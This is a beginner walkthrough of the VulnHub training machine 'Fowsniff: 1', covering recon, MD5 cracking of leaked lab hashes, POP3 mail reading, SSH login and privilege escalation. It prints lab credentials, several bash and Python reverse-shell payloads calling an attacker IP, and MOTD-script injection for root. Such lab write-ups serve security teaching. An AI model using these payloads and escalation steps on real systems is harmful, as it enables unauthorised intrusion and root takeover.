# Fowsniff: 1 — VulnHub Walkthrough (Beginner Friendly)

A step-by-step, beginner-friendly walkthrough for the VulnHub machine **"Fowsniff: 1"** by berzerk0. This box demonstrates OSINT/password leaks, POP3 mail enumeration, credential reuse, and privilege escalation via a writable MOTD script.

| Metadata | Value |
| --- | --- |
| **Machine** | Fowsniff: 1 |
| **Author** | berzerk0 |
| **Platform** | VulnHub (VirtualBox OVA) |
| **Difficulty** | **3 — Easy** (stated: *Easy*) |
| **Focus Areas** | OSINT (password leak), MD5 cracking, POP3, SSH, Privilege Escalation |
| **Target IP (Example)** | `192.168.56.101` |

> **Note:** Your target IP may differ depending on your network (NAT/Host-Only). Replace `192.168.56.101` with your machine's IP throughout this walkthrough.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By completing this lab, you'll learn:

- How to perform reconnaissance and enumeration on a Linux target.
- How a real-world password leak (Pastebin/Twitter leak) can be used for initial access (OSINT).
- How to crack MD5 password hashes using John the Ripper and wordlists.
- How to enumerate email via POP3 (`nc`, manual commands) and extract credentials.
- How to identify privilege escalation vectors (writable files, group permissions).
- How MOTD (`/etc/update-motd.d/`) scripts run as root on SSH login.
- How to safely document findings for educational purposes.

> **Why it works:** Fowsniff Corp's credentials were leaked in the wild (MD5 hashes posted publicly). The POP3 service was left open, allowing reuse of cracked passwords to read internal emails which revealed a shared SSH temporary password. A script executed by root on SSH login (`/opt/cube/cube.sh` via MOTD) was writable by the `users` group, allowing privilege escalation to root.

---

## 1. Reconnaissance

First, discover the target machine's IP address on your local lab network.

### 1.1 Check your IP/interface
```bash
ip a
```
> **Why it works:** Identifies your attack machine's network range (e.g., `192.168.56.0/24` or `192.168.1.0/24`) to scan for the target.

### 1.2 ARP scan (quick host discovery)

> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
arp-scan -l
```
> **Why it works:** Lists live hosts on the local subnet. Look for a new Linux host (Fowsniff).

### 1.3 Ping sweep (optional)

> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -sn 192.168.56.0/24
```
> **Why it works:** Discovers live hosts. Replace the subnet with yours from step 1.1. Identify the target IP (e.g., `192.168.56.101`).

> **Expected:** Find target IP `192.168.56.101`. We'll use this throughout.

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

Now scan for open services and explore the web server.

### 2.1 Full port/service scan
```bash
nmap -p- -sC -sV 192.168.56.101
```
> **Why it works:** Scans all TCP ports (`-p-`), runs default scripts (`-sC`) for service enumeration, and versions services (`-sV`). Gives a complete picture.

**Realistic Expected Output:**
```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-13 03:30 IST
Nmap scan report for 192.168.56.101
Host is up (0.00041s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Key services identified:**
> - `22/SSH` — Remote shell access
> - `80/HTTP` — Apache web server (homepage references Fowsniff Corp breach)
> - `110/POP3` — Post Office Protocol v3 (email retrieval)
> - `143/IMAP` — Internet Message Access Protocol (email access)

> **Why POP3/IMAP matter:** Email protocols that can be used to retrieve internal mail if credentials are valid. The breach leak targets mailbox access.

### 2.2 Explore the Web (Port 80)

Open `http://192.168.56.101` in a browser.

- The homepage is a simple Fowsniff Corp page and references a breach/tweet from `@fowsniffcorp`.
- No obvious exploitable links or login forms are visible on the surface.
- Common next step: search for "Fowsniff Corp" breach info (OSINT).

![Homepage](images/01-homepage.png)
*Placeholder: Homepage of Fowsniff Corp (port 80)*

---

## 3. Cracking the Leak (OSINT + John the Ripper)

### 3.1 Find the leaked hash dump

The canonical leak (from community sources) contains MD5 hashes of employee email passwords:

```text
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

> **Why it works:** MD5 is unsalted/fast to crack with a wordlist. The dump gives us usernames + hashes to attack via offline cracking.

Save to files on your attacker machine:

```bash
cat > fowsniff_hashes.txt << 'EOF'
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
EOF
cut -d':' -f2 fowsniff_hashes.txt > hashes.txt
cut -d'@' -f1 fowsniff_hashes.txt > users.txt
```

### 3.2 Crack MD5 hashes with John the Ripper


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked (8/9):**
```text
scoobydoo2       (seina@fowsniff)
orlando12        (parede@fowsniff)
apples01         (tegel@fowsniff)
skyler22         (baksteen@fowsniff)
mailcall         (mauer@fowsniff)
07011972         (sciana@fowsniff)
carp4ever        (mursten@fowsniff)
bilbo101         (mustikka@fowsniff)
```

Show results:
```bash
john --format=raw-md5 --show hashes.txt
```

![John Cracking](images/02-john-crack.png)
*Placeholder: John the Ripper cracking MD5 hashes*

---

## 4. Foothold (POP3 → SSH)

### 4.1 Read emails via POP3

Connect with netcat:

> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc 192.168.56.101 110
```

Login:
```text
USER seina
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
```

**RETR 1 excerpt:**
```text
Subject: URGENT! Security EVENT!
...
The temporary password for SSH is "S1ck3nBluff+secureshell"
...
```

> **Why it works:** Internal mail reveals the shared SSH temp password.

![POP3 Access](images/03-pop3-access.png)
*Placeholder: Reading mail via POP3*

### 4.2 SSH into the box

```bash
ssh baksteen@192.168.56.101
# Password: S1ck3nBluff+secureshell
```

Check identity:
```bash
id
# uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
```

> User is in `users` group — key for privesc.

![SSH Login](images/04-ssh-login.png)
*Placeholder: SSH as baksteen showing MOTD*

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 5. Privilege Escalation

### 5.1 Find files owned by group `users`

```bash
find / -group users -type f 2>/dev/null
```

Focus on `/opt/cube/cube.sh`.

### 5.2 Inspect cube.sh and MOTD trigger


> ### 📖 Concept — Finding files root executes that *you* can write
>
> This is the classic Linux privilege-escalation question: *is there anything that
> runs with elevated privileges whose contents I control?*
>
> ```bash
> find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" \
>      -not -path "/dev/*" -not -path "/run/*" 2>/dev/null
> find / -type f -perm -ug=rwx 2>/dev/null                    # rwx for user AND group
> find / -xdev -type f -perm -0002 -user root 2>/dev/null      # world-writable, root-owned
> ```
>
> `-perm -0002` tests the **other-write** bit. `-xdev` keeps the search on one
> filesystem so you do not wander into `/proc`.
>
> **High-value targets, in rough order of usefulness:**
>
> | Path | Why |
> | --- | --- |
> | **`/etc/passwd`** | Append a UID-0 account → `su` → root |
> | **`/etc/update-motd.d/*`** | Scripts run **as root on every SSH login** (MOTD injection) |
> | `/etc/sudoers`, `/etc/sudoers.d/*` | Add yourself a `NOPASSWD` rule |
> | `/etc/shadow` | Replace a hash with one you know |
> | `/etc/ld.so.preload` | A library loaded into **every** process, as root |
> | `/etc/crontab`, `/etc/cron.*` | Add a root job |
> | `/etc/exports` | Add `no_root_squash` to an NFS export |
> | root-owned scripts in `/opt`, `/srv`, `/usr/local` | Frequently world-writable by mistake |
> | any user's `~/.ssh/authorized_keys` | Passwordless SSH as them |
>
> **MOTD injection deserves special mention.** On Ubuntu/Debian, `pam_motd` runs every
> script in `/etc/update-motd.d/` during SSH login, historically **as root**. If any
> is writable by you, append a payload and log in again:
>
> ```bash
> echo 'bash -c "bash -i >& /dev/tcp/192.168.56.10/9090 0>&1"' >> /etc/update-motd.d/00-header
> exit ; ssh user@target      # → root reverse shell
> ```
>
> Use `>>` to **append** — `>` truncates the script and breaks the MOTD, which is how
> you end up wondering why nothing happened. Verify with `tail`.
>
> **Deep dive:** [CONCEPTS §15.6 — Writable files](../../docs/CONCEPTS.md#156-writable-files-and-directories) ·
> [§15.11 — MOTD injection](../../docs/CONCEPTS.md#1511-motd-injection)

```bash
cat /opt/cube/cube.sh
cat /etc/update-motd.d/00-header
```

> **Why it works:** `00-header` runs `sh /opt/cube/cube.sh` as root during SSH login. `cube.sh` is writable by group `users`.

### 5.3 Inject reverse shell

Replace `192.168.56.10` with your attacker IP:
```bash
cat > /opt/cube/cube.sh << 'EOF'
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
EOF
chmod +x /opt/cube/cube.sh
```

### 5.4 Trigger and receive root shell

Attacker:
```bash
nc -lvnp 4444
```

Trigger:
```bash
ssh baksteen@192.168.56.101
# login again
```

On listener:
```text
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

![Root Shell](images/05-root-shell.png)
*Placeholder: Root reverse shell*

### 5.5 Get flag

```bash
cat /root/root.txt
```

![Root Flag](images/06-root-flag.png)
*Placeholder: Root flag*

---

## 6. Summary of vulnerabilities

| Phase | Action | Result |
|---|---|---|
| **Recon** | `nmap -p- -sC -sV` | SSH(22), HTTP(80), POP3(110), IMAP(143) |
| **OSINT/Crack** | Leak + `john --format=raw-md5` | 8 creds cracked (e.g., `seina:scoobydoo2`) |
| **Foothold** | POP3 RETR 1 | SSH temp: `S1ck3nBluff+secureshell` |
| **Access** | SSH as `baksteen` | Non-root, in `users` group |
| **Privesc** | Writable `/opt/cube/cube.sh` via MOTD | Inject reverse shell → **root** |
| **Flag** | `cat /root/root.txt` | Complete |

**Exploit Chain:** Leak → Crack MD5 → POP3 → Email creds → SSH → Writable MOTD script (`/opt/cube/cube.sh`) → Root.

---

## 7. Defensive Lessons

- Never use unsalted MD5 for passwords.
- Restrict external exposure of mail services (POP3/IMAP).
- Enforce unique, strong passwords; rotate shared/temp creds.
- Avoid group-writable root-owned scripts (especially those run at login).
- Harden MOTD: validate ownership/permissions.
- Patch legacy authentication systems.

---

## 8. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- [Fowsniff: 1 — VulnHub](https://vulnhub.com/entry/fowsniff-1,262/)
- [Fowsniff: 1 Walkthrough — Hacking Articles](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/)
- [Fowsniff CTF Walkthrough — Infosec Institute](https://www.infosecinstitute.com/resources/capture-the-flag/fowsniff-ctf-walkthrough/)
- [Fowsniff Writeup — StrongShiv8](https://strongshiv8.github.io/posts/Fowsniff-CTF/)
- [TryHackMe Fowsniff — Chaudhary1337](https://chaudhary1337.github.io/p/tryhackme-fowsniff-ctf-writeup/)
- [Fowsniff CTF — Ligniform](https://ligniform.blog/posts/fowsniff-ctf-writeup/)

---

## 9. Screenshot Checklist

- [ ] `01-homepage.png` — Webpage at `http://192.168.56.101`
- [ ] `02-john-crack.png` — John cracking MD5 hashes
- [ ] `03-pop3-access.png` — POP3 mail access
- [ ] `04-ssh-login.png` — SSH as `baksteen`
- [ ] `05-root-shell.png` — Root reverse shell
- [ ] `06-root-flag.png` — Root flag